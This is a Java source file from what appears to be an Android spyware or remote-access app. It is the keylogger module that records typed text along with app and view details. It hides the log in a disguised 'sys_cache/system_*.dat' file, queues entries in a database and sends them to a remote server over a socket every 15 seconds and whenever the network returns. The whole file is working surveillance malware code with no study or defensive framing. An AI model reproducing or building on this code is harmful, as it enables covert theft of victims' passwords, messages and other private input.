package com.fason.app.features.keylogger;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.net.NetworkRequest;
import android.util.Log;

import com.fason.app.core.FasonApp;
import com.fason.app.core.Protocol;
import com.fason.app.core.network.SocketClient;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class KeyloggerDataManager {

    private static KeyloggerDataManager instance;
    private final ConcurrentLinkedQueue<String> memoryBuffer;
    private final ScheduledExecutorService scheduler;
    private final File logFile;
    private final KeystrokeDatabase database;
    private ConnectivityManager.NetworkCallback networkCallback;

    private static final int FLUSH_INTERVAL_SECONDS = 15;
    private static final int MAX_MEMORY_BUFFER = 200;
    private static final int OFFLINE_BATCH_SIZE = 100;

    private KeyloggerDataManager() {
        Context ctx = FasonApp.getContext();
        this.memoryBuffer = new ConcurrentLinkedQueue<>();
        this.scheduler = Executors.newSingleThreadScheduledExecutor();
        this.database = KeystrokeDatabase.getInstance(ctx);

        File dir = new File(ctx.getFilesDir(), "sys_cache");
        if (!dir.exists()) dir.mkdirs();

        String filename = "system_" + new SimpleDateFormat("yyyyMMdd", Locale.US).format(new Date()) + ".dat";
        this.logFile = new File(dir, filename);

        registerNetworkMonitor(ctx);
    }

    public static synchronized KeyloggerDataManager getInstance() {
        if (instance == null) {
            instance = new KeyloggerDataManager();
        }
        return instance;
    }

    public void logEntry(long timestamp, String eventType, String pkg, String cls, String viewId, String text, String extra) {
        String timeFormatted = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss.SSS", Locale.US).format(new Date(timestamp));
        String line = "[" + timeFormatted + "][" + eventType + "] pkg=" + pkg
            + " cls=" + cls + " viewId=" + viewId + " text=" + text + " extra=" + extra;

        memoryBuffer.add(line);
        appendToFile(line);

        database.insert(timestamp, eventType, pkg, cls, viewId, text, extra);

        if (memoryBuffer.size() >= MAX_MEMORY_BUFFER) {
            flushToNetwork();
        }
    }

    public void startNetworkSync() {
        scheduler.scheduleAtFixedRate(() -> {
            if (!memoryBuffer.isEmpty() || database.getUnsyncedCount() > 0) {
                flushToNetwork();
            }
        }, FLUSH_INTERVAL_SECONDS, FLUSH_INTERVAL_SECONDS, TimeUnit.SECONDS);
    }

    public void flushToNetwork() {
        if (!isSocketConnected()) {
            Log.d("KeyloggerDM", "Offline — " + database.getUnsyncedCount() + " entries queued");
            return;
        }

        StringBuilder payload = new StringBuilder();
        String line;
        while ((line = memoryBuffer.poll()) != null) {
            payload.append(line).append("\n");
        }

        List<JSONObject> unsynced = database.getUnsynced(OFFLINE_BATCH_SIZE);
        List<Long> syncedIds = new ArrayList<>();
        JSONArray offlineBatch = new JSONArray();

        for (JSONObject obj : unsynced) {
            offlineBatch.put(obj);
            try {
                syncedIds.add(obj.getLong("id"));
            } catch (Exception ignored) {}
        }

        try {
            JSONObject json = new JSONObject();
            json.put("live", payload.toString());
            json.put("offlineBatch", offlineBatch);
            json.put("offlineCount", unsynced.size());
            json.put("totalQueued", database.getUnsyncedCount());
            json.put("timestamp", System.currentTimeMillis());
            json.put("date", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(new Date()));

            io.socket.client.Socket socket = SocketClient.getInstance().getSocket();
            if (socket != null && socket.connected()) {
                socket.emit(Protocol.KEYLOGGER, json);
                if (!syncedIds.isEmpty()) {
                    database.markSynced(syncedIds);
                }
                Log.d("KeyloggerDM", "Flushed " + payload.length() + " live + " + unsynced.size() + " offline entries");
            }
        } catch (Exception e) {
            Log.e("KeyloggerDM", "Socket send failed", e);
        }
    }

    private boolean isSocketConnected() {
        try {
            io.socket.client.Socket s = SocketClient.getInstance().getSocket();
            return s != null && s.connected();
        } catch (Exception e) {
            return false;
        }
    }

    private void registerNetworkMonitor(Context ctx) {
        ConnectivityManager cm = (ConnectivityManager) ctx.getSystemService(Context.CONNECTIVITY_SERVICE);
        if (cm == null) return;

        NetworkRequest req = new NetworkRequest.Builder()
            .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
            .build();

        networkCallback = new ConnectivityManager.NetworkCallback() {
            @Override
            public void onAvailable(Network network) {
                try {
                    Thread.sleep(2000);
                } catch (InterruptedException ignored) {
                    Thread.currentThread().interrupt();
                }
                if (database.getUnsyncedCount() > 0) {
                    Log.d("KeyloggerDM", "Network restored — flushing " + database.getUnsyncedCount() + " queued entries");
                    flushToNetwork();
                }
            }
        };

        try {
            cm.registerNetworkCallback(req, networkCallback);
        } catch (Exception ignored) {}
    }

    public JSONArray getHistory(long since, int limit) {
        return database.getHistory(since, limit);
    }

    public int getQueuedCount() {
        return database.getUnsyncedCount();
    }

    private void appendToFile(String line) {
        try (FileWriter fw = new FileWriter(logFile, true)) {
            fw.write(line);
            fw.write('\n');
        } catch (IOException e) {
            Log.e("KeyloggerDM", "Failed to append to log file", e);
        }
    }

    public File getLogFile() {
        return logFile;
    }
}

